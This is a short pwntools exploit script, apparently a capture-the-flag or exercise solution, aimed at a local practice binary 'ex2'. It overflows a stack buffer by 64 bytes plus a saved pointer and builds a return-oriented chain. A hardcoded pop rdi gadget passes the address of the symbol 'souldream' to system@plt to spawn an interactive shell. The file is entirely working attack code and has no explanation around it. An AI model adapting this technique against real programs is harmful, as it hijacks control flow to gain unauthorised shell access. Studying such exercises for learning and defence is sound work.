from pwn import *

context.update(arch='amd64', os='linux')
target = process('./bin/ex2')

elf = ELF('./bin/ex2', checksec=False)
addr_souldream = elf.symbols['souldream']
addr_system = elf.plt['system']

pop_rdi_rbp_gadget = 0x4012b5
binsh = b'/bin/sh;'

offset = 72 - 8

payload = binsh + b'a' * offset + p64(pop_rdi_rbp_gadget) + p64(addr_souldream) + p64(addr_souldream) + p64(addr_system)

target.send(payload)
target.interactive()
